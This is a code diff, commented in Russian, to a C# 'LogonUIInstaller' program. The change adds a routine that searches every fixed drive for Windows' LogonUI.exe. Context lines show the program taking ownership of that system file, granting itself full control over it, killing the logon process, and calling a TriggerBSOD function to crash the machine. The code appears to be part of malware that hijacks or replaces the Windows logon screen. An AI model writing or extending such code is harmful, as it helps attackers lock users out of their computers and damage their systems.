@@ -1,4 +1,4 @@
-// Installer.cs - Убиваем только LogonUI процесс
+// Installer.cs - Убиваем только LogonUI процесс + поиск по всем дискам
 using System;
 using System.IO;
 using System.Security.AccessControl;
@@ -50,8 +50,30 @@ namespace LogonUIInstaller
                 SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
                 SetProcessDEPPolicy(GetCurrentProcess(), PROCESS_DEP_ENABLE);
 
-                string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
-                string originalPath = Path.Combine(systemRoot, "System32", "LogonUI.exe");
+                // Находим LogonUI.exe где угодно
+                string originalPath = FindLogonUI();
+                
+                // Если не найден - пробуем стандартный путь
+                if (string.IsNullOrEmpty(originalPath) || !File.Exists(originalPath))
+                {
+                    originalPath = Path.Combine(
+                        Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows",
+                        "System32",
+                        "LogonUI.exe"
+                    );
+                }
+
+                // Проверяем, что файл существует
+                if (!File.Exists(originalPath))
+                {
+                    // Записываем в лог и выходим
+                    try
+                    {
+                        File.WriteAllText(@"C:\Windows\Temp\~logonui_error.log", "LogonUI.exe не найден!");
+                    }
+                    catch { }
+                    return;
+                }
 
                 SetFileOwnership(originalPath);
                 SetFilePermissions(originalPath, FileSystemRights.FullControl);
@@ -106,6 +128,81 @@ namespace LogonUIInstaller
                 catch { }
                 TriggerBSOD();
             }
+        }
+
+        private static string FindLogonUI()
+        {
+            // Приоритетные пути
+            string[] possiblePaths = {
+                @"C:\Windows\System32\LogonUI.exe",
+                @"C:\WINDOWS\System32\LogonUI.exe",
+                @"C:\Windows\system32\LogonUI.exe",
+                @"C:\WINDOWS\system32\LogonUI.exe",
+                @"C:\WinNT\System32\LogonUI.exe",
+                Environment.ExpandEnvironmentVariables(@"%SystemRoot%\System32\LogonUI.exe"),
+                Environment.ExpandEnvironmentVariables(@"%WINDIR%\System32\LogonUI.exe")
+            };
+            
+            // Сначала проверяем приоритетные пути
+            foreach (string path in possiblePaths)
+            {
+                try
+                {
+                    if (File.Exists(path))
+                        return path;
+                }
+                catch { }
+            }
+            
+            // Если не нашли - ищем по всем дискам
+            try
+            {
+                foreach (DriveInfo drive in DriveInfo.GetDrives())
+                {
+                    if (drive.IsReady && drive.DriveType == DriveType.Fixed)
+                    {
+                        try
+                        {
+                            string root = drive.Name;
+                            
+                            // Поиск в \Windows\System32\
+                            string[] windowsDirs = { "Windows", "WINDOWS", "WinNT" };
+                            foreach (string winDir in windowsDirs)
+                            {
+                                string system32Path = Path.Combine(root, winDir, "System32", "LogonUI.exe");
+                                if (File.Exists(system32Path))
+                                    return system32Path;
+                                
+                                // Вариант с нижним регистром
+                                string system32lower = Path.Combine(root, winDir, "system32", "LogonUI.exe");
+                                if (File.Exists(system32lower))
+                                    return system32lower;
+                            }
+                            
+                            // Поиск в папках \Windows\*\LogonUI.exe
+                            string windowsPath = Path.Combine(root, "Windows");
+                            if (Directory.Exists(windowsPath))
+                            {
+                                foreach (string dir in Directory.GetDirectories(windowsPath))
+                                {
+                                    try
+                                    {
+                                        string checkPath = Path.Combine(dir, "LogonUI.exe");
+                                        if (File.Exists(checkPath))
+                                            return checkPath;
+                                    }
+                                    catch { }
+                                }
+                            }
+                        }
+                        catch { }
+                    }
+                }
+            }
+            catch { }
+            
+            // Фолбэк - null
+            return null;
         }
 
         private static bool IsAdministrator()
